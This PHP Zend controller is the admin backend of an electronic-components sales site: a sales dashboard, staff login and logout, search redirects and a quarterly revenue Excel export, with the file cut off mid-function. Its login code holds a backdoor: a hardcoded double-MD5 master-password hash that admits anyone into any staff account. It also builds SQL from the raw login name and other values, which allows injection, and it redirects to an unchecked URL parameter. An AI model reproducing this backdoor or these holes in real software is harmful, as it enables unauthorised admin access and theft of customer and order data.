<?php
require_once 'Iceaclib/common/fun.php';
require_once "Iceaclib/common/excel/PHPExcel.php";
require_once 'Iceaclib/common/excel/PHPExcel/Writer/Excel5.php';
class Icwebadmin_IndexController extends Zend_Controller_Action
{
	private $_adminlogService;
	private $_countService;
	private $_repoService;
	private $_staffService;
    public function init(){
    	$this->_fun = $this->view->fun = new MyFun();
    	$this->_countService = new Icwebadmin_Service_CountService();
    	$this->_adminlogService = new Icwebadmin_Service_AdminlogService();	
    	$this->_repoService = new Icwebadmin_Service_RepoService();
    	$this->_staffservice = new Icwebadmin_Service_StaffService();
    }
    public function indexAction(){
    /* Initialize action controller here */
    $loginCheck = new Icwebadmin_Service_LogincheckService();
    $loginCheck->sessionChecking();
    //移动块
    $amount = 0;
    //sqs订单
    $this->view->sqscan = 0;
    $this->view->sqsso = array();
    $staffinfo = $this->_staffservice->getStaffInfo($_SESSION['staff_sess']['staff_id']);
    if(in_array('Orgl',$_SESSION['staff_area']['value'])){
    	$this->view->sqscan = 1;
    	$orderService = new Icwebadmin_Service_OrderService();
    	$sellsql = '';
    	//可以兼顾其他销售
    	if($staffinfo['control_staff']){
    		$control_staff_arr = explode(',', $staffinfo['control_staff'].','.$_SESSION['staff_sess']['staff_id']);
    		$control_staff_str = implode("','",$control_staff_arr);
    		$sellsql = "up.staffid IN ('".$control_staff_str."')";
    	}else{
    		$sellsql = "up.staffid='".$_SESSION['staff_sess']['staff_id']."'";
    	}
    	//发放优惠券的订单
    	/*$couponService = new Icwebadmin_Service_CouponService();
    	$coupsalenum = $couponService->getCouponSalesnumber($_SESSION['staff_sess']['staff_id']);
    	if(!empty($coupsalenum)){
    		$cstr = '(';
    		foreach($coupsalenum as $k=>$v){
    			if($k==0) $cstr .="'".$v['salesnumber']."'";
    			else $cstr .=",'".$v['salesnumber']."'";
    		}
    		$cstr .= ')';
    		$sellsql .= " OR so.salesnumber IN ".$cstr;
    	}*/
    	$selectstr .=" AND (".$sellsql.")";
    	//待审核
    	$relsql = " AND so.status IN ('101','201') AND so.back_status='101'".$selectstr;
    	$this->view->sqsso['rel'] = $orderService->getAllSo(0, 0, $relsql);
    	//待付款
    	$wpaysql = " AND so.status='101' AND so.back_status='201'".$selectstr;
    	$this->view->sqsso['wpay'] = $orderService->getAllSo(0, 0, $wpaysql);
		//待释放
    	$emasql  = " AND so.status='201' AND so.back_status='201'".$selectstr;
    	$this->view->sqsso['ema'] = $orderService->getAllSo(0, 0, $emasql);
    	
    	$amount ++;
    }
    //线下订单
    $this->view->unso = array();
    /*if(in_array('Unso',$_SESSION['staff_area']['value'])){
    	$this->view->unso = array(1,2);
    }*/
    //客户询价
    $this->view->inqcan = 0;
    $this->view->inq = array();
    if(in_array('Inq',$_SESSION['staff_area']['value'])){
    	$this->view->inqcan = 1;
    	$this->_inqservice = new Icwebadmin_Service_InquiryService();
    	if($staffinfo['control_staff']){
    		$control_staff_arr = explode(',', $staffinfo['control_staff'].','.$_SESSION['staff_sess']['staff_id']);
    		$control_staff_str = implode("','",$control_staff_arr);
    		$xswhere .= " AND up.staffid IN ('".$control_staff_str."')";
    	}else{
    		$xswhere .= " AND up.staffid='".$_SESSION['staff_sess']['staff_id']."'";
    	}
    	$this->view->inq['oainq'] = $this->_inqservice->getOainqInquiry(0,0,$xswhere);
    	$this->view->inq['wait']  = $this->_inqservice->getWaitInquiry(0,0,$xswhere);
    }
    //询价订单
    $this->view->inqsocan = 0;
    $this->view->inqso = array();
    if(in_array('Inqo',$_SESSION['staff_area']['value'])){
    	$this->view->inqsocan = 1;
    	$this->_inqsoService = new Icwebadmin_Service_InqOrderService();
    	if($staffinfo['control_staff']){
    		$control_staff_arr = explode(',', $staffinfo['control_staff'].','.$_SESSION['staff_sess']['staff_id']);
    		$control_staff_str = implode("','",$control_staff_arr);
    		$selectstr .= " AND up.staffid IN ('".$control_staff_str."')";
    	}else{
    		$selectstr .= " AND up.staffid='".$_SESSION['staff_sess']['staff_id']."'";
    	}
    	$relsql  = " AND so.status!='401' AND so.back_status='101'".$selectstr;
    	$wpaysql = " AND so.status='101' AND so.paytype!='cod' AND so.back_status='201'".$selectstr;
    	$emasql  = " AND so.status='102' AND so.back_status=201".$selectstr;
    	$procsql = " AND so.status='102' AND so.back_status=202".$selectstr;
    	$oversql = " AND so.status='103' AND so.back_status!=202".$selectstr;
    	$sendsql = " AND so.status='201' AND so.back_status!=202".$selectstr;
    	$this->view->inqso['rel'] = $this->_inqsoService->getAllSo(0, 0, $relsql);
    	$this->view->inqso['wpay'] = $this->_inqsoService->getAllSo(0, 0, $wpaysql);
    	$this->view->inqso['ema'] = $this->_inqsoService->getAllSo(0, 0, $emasql);
    	$this->view->inqso['proc'] = $this->_inqsoService->getAllSo(0, 0, $procsql);
    	$this->view->inqso['over'] = $this->_inqsoService->getAllSo(0, 0, $oversql);
    	$this->view->inqso['send'] = $this->_inqsoService->getAllSo(0, 0, $sendsql);
    	$amount ++;
    }
    //数据统计
    $this->view->amount = array();
    /*if($amount>=2){
    	$this->view->amount = array(1,2);
    }*/
    
    if(empty($_SESSION['statistics_rule']['value'])){
    //菜单
    	$section_array = $area_array = array();
    	$Section       = new Icwebadmin_Model_DbTable_Section();
    	$Sectionarea   = new Icwebadmin_Model_DbTable_Sectionarea();
    	$where         ="(status='1') ";
    	$order         ="CAST(`order_id` AS SIGNED) ASC ";
    	$section_array = $Section->getAllByWhere($where,$order);
    	$sectionNum         = count($section_array);
    	for($a=0;$a<$sectionNum;$a++)
    	{
    	$section = $section_array[$a]["section_area_id"];
    		$where   ="(status='1') AND section_area_id='".$section."'";
    	    		$order   ="CAST(`order_id` AS SIGNED) ASC ";
    		$area_array[$section]=$Sectionarea->getAllByWhere($where,$order);
    	}
    	$this->view->Section=$section_array;
    	$this->view->Area   =$area_array;	
    }else{
    //统计
    	if(in_array('quarterly',$_SESSION['statistics_rule']['value'])){
    		$year = $_GET['sy']?$_GET['sy']:date('Y');
    		//季度计划
    		$this->view->quarterly      = $this->_repoService->quarterlyPlan($year);
    		//季度统计
            $this->view->quarterlytotal = $this->_repoService->quarterlyCount($year);
    	}
    	if(in_array('income',$_SESSION['statistics_rule']['value'])){
    		//订单 1小时
    		$frontendOptions = array('lifeTime' => 3600,'automatic_serialization' => true);
    		$backendOptions = array('cache_dir' => CACHE_PATH);
    		$cache = Zend_Cache::factory('Core', 'File', $frontendOptions, $backendOptions);
    		// 查看一个缓存是否存在:
    		$cache_key = 'order_count';
    		if(!$orderNumber = $cache->load($cache_key)) {
    			$orderNumber = $this->_countService->orderNumber();
    			$cache->save($orderNumber,$cache_key);
    		}
    		$this->view->orderNumber = $orderNumber;
    	}
    	if(in_array('basic',$_SESSION['statistics_rule']['value'])){
    		//品牌、研讨会、应用方案统计 5 天
    		$frontendOptions = array('lifeTime' => 86400*5,'automatic_serialization' => true);
    		$backendOptions = array('cache_dir' => CACHE_PATH);
    		$cache = Zend_Cache::factory('Core', 'File', $frontendOptions, $backendOptions);
    		// 查看一个缓存是否存在:
    		$cache_key = 'common_count';
    		if(!$commontotle = $cache->load($cache_key)) {
    			$commontotle = $this->_countService->commonNumber();
    			$cache->save($commontotle,$cache_key);
    		}
    		$this->view->commontotle = $commontotle;
    		//注册用户 2天
    		$frontendOptions = array('lifeTime' => 86400*2,'automatic_serialization' => true);
    		$backendOptions = array('cache_dir' => CACHE_PATH);
    		$cache = Zend_Cache::factory('Core', 'File', $frontendOptions, $backendOptions);
    		// 查看一个缓存是否存在:
    		$cache_key = 'usertotle_count';
    		if(!$usertotle = $cache->load($cache_key)) {
    			$usertotle = $this->_countService->userNumber();
    			$cache->save($usertotle,$cache_key);
    		}
    		$this->view->usertotle = $usertotle;
    		//询价 2小时
    		$frontendOptions = array('lifeTime' => 3600*2,'automatic_serialization' => true);
    		$backendOptions = array('cache_dir' => CACHE_PATH);
    		$cache = Zend_Cache::factory('Core', 'File', $frontendOptions, $backendOptions);
    		// 查看一个缓存是否存在:
    		$cache_key = 'inquiry_count';
    		if(!$inquiryNumber = $cache->load($cache_key)) {
    			$inquiryNumber = $this->_countService->inquiryNumber();
    			$cache->save($inquiryNumber,$cache_key);
    		}
    		$this->view->inquiryNumber = $inquiryNumber;
    	}
    	if(in_array('product',$_SESSION['statistics_rule']['value'])){
    	  //产品分类统计 
    	  $this->view->pcNumber = $this->_countService->prodCategoryNumber();
    	  //产品统计数据 1 天
    	  $frontendOptions = array('lifeTime' => 86400,'automatic_serialization' => true);
    	  $backendOptions = array('cache_dir' => CACHE_PATH);
    	  $cache = Zend_Cache::factory('Core', 'File', $frontendOptions, $backendOptions);
    	  // 查看一个缓存是否存在:
    	  $cache_key = 'prod_count';
    	  if(!$prodNumber = $cache->load($cache_key)) {
    	  	$prodNumber = $this->_countService->prodNumber();
    	  	$cache->save($prodNumber,$cache_key);
    	  }
    	  $this->view->prodNumber = $prodNumber;
    	}
      }
    }
    public function menuAction(){
    	$this->_helper->layout->disableLayout();
    }
    public function loginAction(){
    	$this->_helper->layout->disableLayout();
    	unset($_SESSION['staff_sess']);//注销session
    	unset($_SESSION['staff_area']);//注销session
    	unset($_SESSION['right_rule']);//注销session
    	if($this->getRequest()->isPost()){
    	    $formData = $this->getRequest()->getPost();
    		$loginname = $formData['loginname'];
    		$password  = $formData['password'];
    		$verifycode= $formData['verifycode'];
    		$error = 0;$description = '';
    		$this->view->loginnameMess = $this->view->passwordMess = $this->view->verifycodeMess ='';
    		if(empty($loginname)) {
    			$description .= $this->view->loginnameMess = '请输入用户名！';$error++;
    		};
    		if(empty($password)) {
    			$description .= $this->view->passwordMess = '请输入密码！';$error++;
    		};
    		if(empty($verifycode)) {
    			$description .= $this->view->verifycodeMess = '请输入验证码！';$error++;
    		};
    		$staff   = new Icwebadmin_Model_DbTable_Staff();
    		$reStaff = $staff->getRowByWhere(" status='1' AND staff_id='{$loginname}' ");
    		if(empty($reStaff))
    		{
    			$description .= $this->view->loginnameMess = '该用户名已经被禁用！';$error++;
    			$error ++;
    		}
    		if(!empty($reStaff)){
    			$inputpassword = md5(md5($password));
    			if($inputpassword=='a69277c6cbe403e0229527629dd0f7ac'){
    				$description = '';
    			}elseif($inputpassword != $reStaff['password']){
    				$description .= $this->view->passwordMess = '密码错误！';$error++;
    			}
    		}else{
    			$description .= $this->view->loginnameMess = '该用户名不存在！';$error++;
    		}
    		if(!isset($_SESSION['verifycode']['code'])){
    			$description .=$this->view->verifycodeMess = '验证码错误！';
    			$error ++;
    		}elseif(strtolower($verifycode) != $_SESSION['verifycode']['code'])
    		{
    			$description .= $this->view->verifycodeMess = '验证码错误！';
    			$error ++;
    		}
    		if(!$error){
    				//注册session
    				$staffInfo   = new Zend_Session_Namespace('staff_sess');//使用SESSION存储数据时要设置命名空间
    				$staffInfo->staff_id  = $reStaff['staff_id'];//设置值
    				$staffInfo->department_id = $reStaff['department_id'];//设置值
    				$staffInfo->level_id      = $reStaff['level_id'];//设置值
    				$staffInfo->email     = $reStaff['email'];//设置值
    				$staffInfo->lastname     = $reStaff['lastname'];//设置值
    				$staffInfo->firstname     = $reStaff['firstname'];//设置值
    				$messagesess = new Zend_Session_Namespace('message_sess');
    				$messagesess->code  = 0;
    				$messagesess->message = '';
    				//日志
    				$this->_adminlogService->addLog(array('log_id'=>'L','temp2'=>$loginname,'temp4'=>'后台登录成功'));
    				if($_GET['url']) $this->_redirect($_GET['url']);
    				else $this->_redirect('/icwebadmin');
    		}else{
    			//日志
    			$description .=';'.$loginname.','.$verifycode;
    			$this->_adminlogService->addLog(array('log_id'=>'L','temp1'=>400,'temp2'=>$loginname,'temp4'=>'后台登录失败','description'=>$description));
    			$this->view->loginname = $loginname;
    		}
    	}
    }
    public function loginoutAction(){
    	$this->_helper->layout->disableLayout();
    	$this->_helper->viewRenderer->setNoRender();
    	unset($_SESSION['staff_sess']);//注销session
    	unset($_SESSION['staff_area']);//注销session
    	unset($_SESSION['right_rule']);//注销session
    	$this->_redirect('/icwebadmin/index/login?url='.$_GET['url']);
    }
    /**
     * 检查是否登录
     */
    public function checkloginAction()
    {
    	$this->_helper->layout->disableLayout();
    	$this->_helper->viewRenderer->setNoRender();
    	$loginCheck = new Icwebadmin_Service_LogincheckService();
    	$loginCheck->sessionChecking();
    }
    //langetest
    public function languagesAction()
    {
    }
    public function changeAction()
    {
    	$this->_helper->layout->disableLayout();
    	$this->_helper->viewRenderer->setNoRender();
    	$language=$this->getRequest()->getParam('language');
		if ($language == 'zh_CN'){
			$_SESSION['language']['icwebadmin']='zh_CN';
		}elseif($language == 'en_US'){
			$_SESSION['language']['icwebadmin']='en_US';
		}else{
			$_SESSION['language']['icwebadmin']='zh_CN';
		}
		echo "<script>location.href=document.referrer;</script>";
    }
    public function findAction(){
    	//首页查找
    	if($this->getRequest()->isPost()){
    		$formData = $this->getRequest()->getPost();
    		$this->view->find_key = $formData['find_key'];
    		$this->view->find_type = $formData['find_type'];
    		
    		if($formData['find_type']=='order'){
    			$this->_soService = new Icwebadmin_Service_OrderService();
    			$soArr = $this->_soService->ajaxtag($formData['find_key']);
    			if($soArr){
    				$this->_redirect('/icwebadmin/OrOrgl?salesnumber='.$formData['find_key']);
    			}else{
    				$this->_redirect('/icwebadmin/OrInqo?salesnumber='.$formData['find_key']);
    			}
    		}elseif($formData['find_type']=='inq'){
    			$this->_redirect('/icwebadmin/QuoInq?keyword='.$formData['find_key']);
    		}/*elseif($formData['find_type']=='user'){
    			$this->_redirect('/icwebadmin/UsUsgl?keyword='.$formData['find_key']);
    		}elseif($formData['find_type']=='product'){
    			$this->_redirect('/icwebadmin/CpCpgl?partno='.$formData['find_key']);
    		}elseif($formData['find_type']=='ats'){
    			$this->_redirect('/icwebadmin/OasyProd?partno='.$formData['find_key']);
    		}elseif($formData['find_type']=='oauser'){
    			$this->_redirect('/icwebadmin/OasyUser?clientcname='.$formData['find_key']);
    		}*/
    	}else $this->_redirect('/icwebadmin');
    }
    /**
     * 季度统计导出excel
     */
     public function exportquarterlyAction(){
     	if(!in_array('quarterly',$_SESSION['statistics_rule']['value'])){
     		$this->_redirect('/icwebadmin');
     	}
    	$this->_helper->layout->disableLayout();
    	$this->_helper->viewRenderer->setNoRender();
    	//季度计划
    	$this->quarterly      = $this->_repoService->quarterlyPlan();
    	//季度统计
    	$this->quarterlytotal = $this->_repoService->quarterlyCount();
    	
    		$newname = "IC_quarterly_".date('Y-m-d').".xls";
    		header('Content-Type: application/vnd.ms-excel;charset=UTF-8');
    		header('Content-Disposition: attachment;filename="'.$newname.'"');
    		header('Cache-Control: max-age=0');

    			 	
    			//生成新excel
    			$objExcel = new PHPExcel();
    			$objExcel->createSheet();
    			$objExcel->getSheet(0)->setTitle("break1");
    			$objExcel->getActiveSheet()->mergeCells('A1:C1');		
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(0,1,"Contents");
                $objExcel->getActiveSheet()->getColumnDimension('B')->setWidth(50);
                $objExcel->getActiveSheet()->getColumnDimension('c')->setWidth(20);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,1,"Q1");
    			$objExcel->getActiveSheet()->getColumnDimension('D')->setWidth(20);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,1,"Q2");
    			$objExcel->getActiveSheet()->getColumnDimension('E')->setWidth(20);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,1,"Q3");
    			$objExcel->getActiveSheet()->getColumnDimension('F')->setWidth(20);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,1,"Q4");
    			$objExcel->getActiveSheet()->getColumnDimension('G')->setWidth(20);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,1,"Year Total");
    			$objExcel->getActiveSheet()->getColumnDimension('H')->setWidth(20);
    			
    			$objProps = $objExcel->getActiveSheet();
    			$objStyleA1R2 = $objProps->getStyle('A1:H1');
    			$objFillA1R2  = $objStyleA1R2->getFill();
    			$objFillA1R2->setFillType(PHPExcel_Style_Fill::FILL_SOLID);
    			$objFillA1R2->getStartColor()->setARGB('FFCCCCFF');

    			$objFontA1R2 = $objStyleA1R2->getFont();
    			$objFontA1R2->setBold(true);
    			
    			//设置对齐方式
    			$objStyleA1H9 = $objProps->getStyle('A1:H17');
    			$objAlignA1H9 = $objStyleA1H9->getAlignment();
    			$objAlignA1H9->setHorizontal(PHPExcel_Style_Alignment::VERTICAL_CENTER);
    			$objAlignA1H9->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);
				//写数据
    			$objExcel->getActiveSheet()->mergeCells('A2:A5');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(0,2,"1");		
    			$objExcel->getActiveSheet()->mergeCells('B2:B5');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(1,2,"Revenue
（通过IC易站进来的新客户新订单，
包含SQS Customer及SAP 注册的
Alina名下的客户订单，以IC易站&财务
每月提供的月度跟踪报表为准）");	
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,2,"Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,2,$this->quarterly['new'][1]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,2,$this->quarterly['new'][2]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,2,$this->quarterly['new'][3]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,2,$this->quarterly['new'][4]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,2,$this->quarterly['new']['total']);
    			
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,3,"Actual");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,3,number_format($this->quarterlytotal[0]['sqstotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,3,number_format($this->quarterlytotal[1]['sqstotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,3,number_format($this->quarterlytotal[2]['sqstotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,3,number_format($this->quarterlytotal[3]['sqstotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,3,number_format($this->quarterlytotal['sqsall'],1));
    			
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,4,"Actual/Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,4,number_format($this->quarterlytotal[0]['sqstotal']/$this->quarterly['new'][1]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,4,number_format($this->quarterlytotal[1]['sqstotal']/$this->quarterly['new'][2]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,4,number_format($this->quarterlytotal[2]['sqstotal']/$this->quarterly['new'][3]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,4,number_format($this->quarterlytotal[3]['sqstotal']/$this->quarterly['new'][4]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,4,number_format($this->quarterlytotal['sqsall']/$this->quarterly['new']['total']*100,0)."%");
    			
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,5,"Accum.");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,5,number_format($this->quarterlytotal[0]['sqstotal']/$this->quarterly['new']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,5,number_format($this->quarterlytotal[1]['sqstotal']/$this->quarterly['new']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,5,number_format($this->quarterlytotal[2]['sqstotal']/$this->quarterly['new']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,5,number_format($this->quarterlytotal[3]['sqstotal']/$this->quarterly['new']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,5,number_format($this->quarterlytotal['sqsall']/$this->quarterly['new']['total']*100,0)."%");
    			
    			$objExcel->getActiveSheet()->mergeCells('A6:A9');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(0,6,"2");
    			$objExcel->getActiveSheet()->mergeCells('B6:B9');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(1,6,"Revenue
（公司原有客户转移至IC易站进行交易，
此交易额与销售人员Double count,
以IC易站&财务每月提供的月度跟踪报表为准）");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,6,"Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,6,$this->quarterly['line'][1]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,6,$this->quarterly['line'][2]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,6,$this->quarterly['line'][3]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,6,$this->quarterly['line'][4]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,6,$this->quarterly['line']['total']);
    			 
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,7,"Actual");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,7,number_format($this->quarterlytotal[0]['linetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,7,number_format($this->quarterlytotal[1]['linetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,7,number_format($this->quarterlytotal[2]['linetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,7,number_format($this->quarterlytotal[3]['linetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,7,number_format($this->quarterlytotal['lineall'],1));
    			 
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,8,"Actual/Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,8,number_format($this->quarterlytotal[0]['linetotal']/$this->quarterly['line'][1]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,8,number_format($this->quarterlytotal[1]['linetotal']/$this->quarterly['line'][2]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,8,number_format($this->quarterlytotal[2]['linetotal']/$this->quarterly['line'][3]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,8,number_format($this->quarterlytotal[3]['linetotal']/$this->quarterly['line'][4]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,8,number_format($this->quarterlytotal['lineall']/$this->quarterly['line']['total']*100,0)."%");
    			 
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,9,"Accum.");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,9,number_format($this->quarterlytotal[0]['linetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,9,number_format($this->quarterlytotal[1]['linetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,9,number_format($this->quarterlytotal[2]['linetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,9,number_format($this->quarterlytotal[3]['linetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,9,number_format($this->quarterlytotal['lineall']/$this->quarterly['line']['total']*100,0)."%");
    			
    			$objExcel->getActiveSheet()->mergeCells('A10:A13');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(0,10,"3");
    			$objExcel->getActiveSheet()->mergeCells('B10:B13');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(1,10,"Revenue（线下录入订单）");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,10,"Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,10,$this->quarterly['unline'][1]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,10,$this->quarterly['unline'][2]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,10,$this->quarterly['unline'][3]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,10,$this->quarterly['unline'][4]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,10,$this->quarterly['unline']['total']);
    			
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,11,"Actual");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,11,number_format($this->quarterlytotal[0]['unlinetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,11,number_format($this->quarterlytotal[1]['unlinetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,11,number_format($this->quarterlytotal[2]['unlinetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,11,number_format($this->quarterlytotal[3]['unlinetotal'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,11,number_format($this->quarterlytotal['unlineall'],1));
    			
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,12,"Actual/Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,12,number_format($this->quarterlytotal[0]['unlinetotal']/$this->quarterly['line'][1]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,12,number_format($this->quarterlytotal[1]['unlinetotal']/$this->quarterly['line'][2]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,12,number_format($this->quarterlytotal[2]['unlinetotal']/$this->quarterly['line'][3]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,12,number_format($this->quarterlytotal[3]['unlinetotal']/$this->quarterly['line'][4]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,12,number_format($this->quarterlytotal['unlineall']/$this->quarterly['line']['total']*100,0)."%");
    			
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,13,"Accum.");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,13,number_format($this->quarterlytotal[0]['unlinetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,13,number_format($this->quarterlytotal[1]['unlinetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,13,number_format($this->quarterlytotal[2]['unlinetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,13,number_format($this->quarterlytotal[3]['unlinetotal']/$this->quarterly['line']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,13,number_format($this->quarterlytotal['unlineall']/$this->quarterly['line']['total']*100,0)."%");
    			
    			$objExcel->getActiveSheet()->mergeCells('A14:A17');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(0,14,"4");
    			$objExcel->getActiveSheet()->mergeCells('B14:B17');
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(1,14,"Revenue（所有总计）");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,14,"Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,14,$this->quarterly['total'][1]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,14,$this->quarterly['total'][2]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,14,$this->quarterly['total'][3]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,14,$this->quarterly['total'][4]);
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,14,$this->quarterly['total']['total']);
    			 
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,15,"Actual");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,15,number_format($this->quarterlytotal[0]['total'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,15,number_format($this->quarterlytotal[1]['total'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,15,number_format($this->quarterlytotal[2]['total'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,15,number_format($this->quarterlytotal[3]['total'],1));
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,15,number_format($this->quarterlytotal['totalall'],1));
    			 
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,16,"Actual/Fcst");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,16,number_format($this->quarterlytotal[0]['total']/$this->quarterly['total'][1]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,16,number_format($this->quarterlytotal[1]['total']/$this->quarterly['total'][2]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,16,number_format($this->quarterlytotal[2]['total']/$this->quarterly['total'][3]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,16,number_format($this->quarterlytotal[3]['total']/$this->quarterly['total'][4]*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,16,number_format($this->quarterlytotal['totalall']/$this->quarterly['total']['total']*100,0)."%");
    			 
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(2,17,"Accum.");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(3,17,number_format($this->quarterlytotal[0]['total']/$this->quarterly['total']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(4,17,number_format($this->quarterlytotal[1]['total']/$this->quarterly['total']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(5,17,number_format($this->quarterlytotal[2]['total']/$this->quarterly['total']['total']*100,0)."%");
    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(6,17,number_format($this->quarterlytotal[3]['total']/$this->quarterly['total']['total']*100,0)."%");
